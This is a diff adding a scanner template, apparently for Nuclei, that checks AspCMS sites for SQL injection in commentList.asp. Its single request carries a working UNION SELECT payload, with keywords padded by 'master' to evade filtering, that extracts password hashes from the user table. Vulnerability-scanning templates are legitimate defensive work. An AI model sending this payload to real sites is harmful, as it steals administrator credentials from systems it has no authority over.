@@ -1,0 +1,25 @@
+id: poc-yaml-aspcms-sqli
+
+info:
+  name: poc-yaml-aspcms-sqli
+  author: z92g(https://github.com/z92g)
+  severity: high
+  tags: xray-converted,sqli,ct-479177
+  reference:
+    - http://wiki.peiqi.tech/wiki/cms/AspCMS/AspCMS%20commentList.asp%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html
+
+http:
+  - raw:
+      - |
+        GET /plug/comment/commentList.asp?id=-1%20unmasterion%20semasterlect%20top%201%20null,null,abs({{rand_int(1000, 9999)}}),Password,1,null,1%20%20frmasterom%20{prefix}user HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        part: body
+        regex:
+          - ">[0-9a-f]{16}</div>"
